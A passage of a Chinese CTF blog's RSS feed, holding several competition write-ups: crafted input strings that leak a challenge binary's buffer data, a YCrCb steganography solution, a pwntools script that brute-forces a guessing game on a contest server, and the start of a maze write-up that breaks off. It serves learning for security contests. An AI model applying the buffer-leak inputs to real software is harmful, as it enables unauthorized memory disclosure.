&lt;strong&gt;exp1：&lt;/strong&gt; &lt;code&gt;&amp;quot;aaaaaaaaaaaa\/*aaaaaaaaaaaa&lt;/code&gt; &lt;br /&gt;
 获得前 11 个 data&lt;/p&gt;
&lt;p&gt;要获得后 11 个 data，必须要把前 11 个 data 放到 buf 里面，才能让后 11 个 buf 出现在 v5 里被读出来，&lt;br /&gt;
这里再用第二个漏洞实在是太麻烦了（仔细想了想，&lt;strong&gt;貌似也不可能&lt;/strong&gt;），所以就用第一个解决。&lt;/p&gt;
&lt;p&gt;一个的 /* 直接放在开头，把后面的 16 个字符换进来，另一个的 /* 放在第 6 个字符的位置，这样加上后面包括 \x00 在内的字符，一共有 11 个，&lt;br /&gt;
这样就把前 11 个 data 再换到 buf 里面，这样后 11 个 data 就正好再 v5 里面被读取&lt;br /&gt;
&lt;strong&gt; exp2：&lt;/strong&gt; &lt;code&gt;/*aaaaaaaaaaaaaaaaa/*aaaaaaa&lt;/code&gt; &lt;br /&gt;
 获得后 11 个 data。（实际上&lt;strong&gt; exp2&lt;/strong&gt; 前后两个可以颠倒，效果一致，因为这里的 exp 无论是先换 16 个字符还是先换那 11 个，都是一样的）&lt;/p&gt;
&lt;h5 id=&#34;方法2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法2&#34;&gt;#&lt;/a&gt; 方法 2&lt;/h5&gt;
&lt;p&gt;方法 2 只变了 leak 前 11 个 data 的方法，后 11 个 data 的方式是一致的&lt;br /&gt;
把 /* 放在 buf 的末尾，算上 \x00 一共会替换 4 个字符，为防止 data 的前 4 个字符被换进 buf，先用 aaaa 组成 v5 的前 4 个，然后再加上 /* ，替换出后面的 data&lt;br /&gt;
&lt;strong&gt;exp：&lt;/strong&gt; &lt;code&gt;aaaaaaaaaaaa/*aaaa/*aaaaaaaa&lt;/code&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://www.sycamore.top/CyberSecurity/CTF/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-YUSA%E7%9A%84%E5%B0%8F%E7%A7%98%E5%AF%86/</guid>
            <title>西湖论剑_YUSA的小秘密</title>
            <link>https://www.sycamore.top/CyberSecurity/CTF/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-YUSA%E7%9A%84%E5%B0%8F%E7%A7%98%E5%AF%86/</link>
            <category>Python</category>
            <category>CTF</category>
            <category>Misc</category>
            <pubDate>Tue, 30 Nov 2021 02:02:55 +1100</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;misc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#misc&#34;&gt;#&lt;/a&gt; Misc&lt;/h2&gt;
&lt;h3 id=&#34;yusa的小秘密&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#yusa的小秘密&#34;&gt;#&lt;/a&gt; YUSA 的小秘密&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL25vbmVTeWNhbW9yZS9hbm5leC95dXNhX3NtYWxsX3NlY3JldC56aXA=&#34;&gt;附件下载&lt;/span&gt;&lt;br /&gt;
题目描述：LSB，但又不是 LSB，众所周知不止 RGB...&lt;br /&gt;
 直接用 stegsolve 打开有两个通道能直接看到 flag，可是噪点实在太多了.&lt;br /&gt;
 联想到题目描述，开始查找资料.&lt;br /&gt;
 可以参考&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ieXRlY3RmLmZlaXNodS5jbi9kb2NzL2RvY2NucXpwR0NXSDFoa0RmNWxqR2RqT0pZZyNxSFJVQ1I=&#34;&gt; Bytectf2020 的 Misc: Hardcore Watermark 01&lt;/span&gt; 这道题&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;图片中每个像素可以通过三个通道来表示，常见的是 &lt;strong&gt;R&lt;/strong&gt; (red) &lt;strong&gt;G&lt;/strong&gt; (green) &lt;strong&gt;B&lt;/strong&gt; (blue) 模式。而本题用到的通道是 YCrCb。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;通过  &lt;code&gt;cv2.cvtColor(img, cv2.COLOR_BGR2YCrCb)&lt;/code&gt;  对 img 图片数据进行色彩空间转换，&lt;br /&gt;
然后保存图片：&lt;br /&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; cv2 &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; cv2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;img = cv2.imread(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Yusa.png&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cv_color = cv2.cvtColor(img, cv2.COLOR_BGR2YCrCb)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cv2.imwrite(&lt;span class=&#34;string&#34;&gt;&amp;#x27;img.png&amp;#x27;&lt;/span&gt;, cv_color)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 再用 stegsolve 看一下通道就可以了&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682436506/Typera/2023/04/0c489cb73329a1ef49146321f8fde3bd.png&#34; alt=&#34;image-20230425232822379&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://www.sycamore.top/CyberSecurity/CTF/2021DASCTF%E5%AE%9E%E6%88%98%E7%B2%BE%E8%8B%B1%E5%A4%8F%E4%BB%A4%E8%90%A5%E6%9A%A8DASCTF-July-X-CBCTF-4th-misc%E9%83%A8%E5%88%86wp/</guid>
            <title>2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th misc部分wp</title>
            <link>https://www.sycamore.top/CyberSecurity/CTF/2021DASCTF%E5%AE%9E%E6%88%98%E7%B2%BE%E8%8B%B1%E5%A4%8F%E4%BB%A4%E8%90%A5%E6%9A%A8DASCTF-July-X-CBCTF-4th-misc%E9%83%A8%E5%88%86wp/</link>
            <category>Python</category>
            <category>CTF</category>
            <category>Misc</category>
            <pubDate>Fri, 26 Nov 2021 21:20:21 +1100</pubDate>
            <description><![CDATA[ &lt;div class=&#34;note warning&#34;&gt;
&lt;p&gt;文章时间太早，图片丢失&lt;/p&gt;
&lt;/div&gt;
&lt;h2 id=&#34;misc-red_vs_blue&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#misc-red_vs_blue&#34;&gt;#&lt;/a&gt; Misc-red_vs_blue&lt;/h2&gt;
&lt;p&gt;简单来说就是 66 轮试错，同一次 nc 里面的答案是一样的，要么输入 r, 要么输入 b，错了就输入 y 重来，因为有时间限制，只能上脚本（本来还想手搓）&lt;br /&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# sh=process(&amp;quot;./buu--rip&amp;quot;)  local端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = remote(&lt;span class=&#34;string&#34;&gt;&amp;#x27;node4.buuoj.cn&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;28699&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tag=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;q = sh.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;:&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; i==&lt;span class=&#34;number&#34;&gt;66&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; tag==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sh.send(&lt;span class=&#34;string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        q=sh.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;:&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(q)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;b&amp;#x27;again&amp;#x27;&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; q:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            i+=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;s.append(&lt;span class=&#34;string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             sh.send(&lt;span class=&#34;string&#34;&gt;&amp;#x27;y&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; m &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; s:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 sh.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;:&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 sh.send(m)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             sh.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;:&amp;#x27;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             tag = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt; tag==&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sh.send(&lt;span class=&#34;string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        q=sh.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;:&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(q)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;b&amp;#x27;again&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; q:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            i += &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;s.append(&lt;span class=&#34;string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              sh.send(&lt;span class=&#34;string&#34;&gt;&amp;#x27;y&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; m &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; s:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  sh.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;:&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  sh.send(m)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              sh.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;:&amp;#x27;&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              tag = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 代码稍微有点小问题，第 66 轮直接跳出来了，懒得改了。。。&lt;br /&gt;
就随便猜一下然后就可以拿到 flag。&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;misc-funny_maze&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#misc-funny_maze&#34;&gt;#&lt;/a&gt; Misc-funny_maze&lt;/h2&gt;
&lt;p&gt;跟前面那题&lt;br /&gt;
差不多的思路，就是典型的迷宫问题多搞几次就能出来 flag.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; 